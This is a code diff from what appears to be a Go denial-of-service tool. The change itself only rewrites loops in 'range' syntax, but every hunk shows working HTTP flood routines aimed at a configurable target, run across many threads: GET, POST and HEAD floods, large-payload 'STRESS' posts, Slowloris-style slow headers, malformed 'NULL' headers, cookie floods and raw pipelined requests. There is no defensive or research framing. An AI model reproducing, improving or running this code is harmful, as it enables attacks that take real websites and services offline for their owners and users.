@@ -30,7 +30,7 @@ type Layer7Config struct {
 
 // RunLayer7Attack executes a Layer 7 attack
 func RunLayer7Attack(cfg *Layer7Config, wg *sync.WaitGroup, stopChan chan struct{}, requestsSent, bytesSent *utils.Counter) {
-	for i := 0; i < cfg.Threads; i++ {
+	for i := range cfg.Threads {
 		wg.Add(1)
 		go func(threadID int) {
 			defer wg.Done()
@@ -73,7 +73,7 @@ func executeLayer7Method(cfg *Layer7Config, requestsSent, bytesSent *utils.Count
 func executeGET(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	client := createHTTPClient(cfg)
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		req, err := http.NewRequest("GET", cfg.Target, nil)
 		if err != nil {
 			continue
@@ -94,7 +94,7 @@ func executeGET(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 func executePOST(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	client := createHTTPClient(cfg)
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		payload := fmt.Sprintf(`{"data": "%s"}`, utils.RandString(32))
 		req, err := http.NewRequest("POST", cfg.Target, strings.NewReader(payload))
 		if err != nil {
@@ -118,7 +118,7 @@ func executePOST(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 func executeHEAD(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	client := createHTTPClient(cfg)
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		req, err := http.NewRequest("HEAD", cfg.Target, nil)
 		if err != nil {
 			continue
@@ -139,7 +139,7 @@ func executeHEAD(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 func executeSTRESS(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	client := createHTTPClient(cfg)
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		payload := fmt.Sprintf(`{"data": "%s"}`, utils.RandString(512))
 		req, err := http.NewRequest("POST", cfg.Target, strings.NewReader(payload))
 		if err != nil {
@@ -173,7 +173,7 @@ func executeSLOW(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	bytesSent.Add(int64(len(headers)))
 
 	// Send keep-alive headers slowly
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		time.Sleep(time.Duration(cfg.RPC) * time.Millisecond / 15)
 		keepAlive := fmt.Sprintf("X-a: %d\r\n", utils.RandInt(1, 5000))
 		conn.Write([]byte(keepAlive))
@@ -188,7 +188,7 @@ func executeNULL(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	}
 	defer conn.Close()
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		headers := buildRawHeaders(cfg.Target, cfg)
 		headers = strings.ReplaceAll(headers, "User-Agent:", "User-Agent: null\r\n#")
 		headers += "Referrer: null\r\n\r\n"
@@ -202,7 +202,7 @@ func executeNULL(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 func executeCOOKIE(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	client := createHTTPClient(cfg)
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		req, err := http.NewRequest("GET", cfg.Target, nil)
 		if err != nil {
 			continue
@@ -233,7 +233,7 @@ func executePPS(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	defer conn.Close()
 
 	targetURL, _ := url.Parse(cfg.Target)
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		request := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
 			targetURL.Path, targetURL.Host)
 		conn.Write([]byte(request))
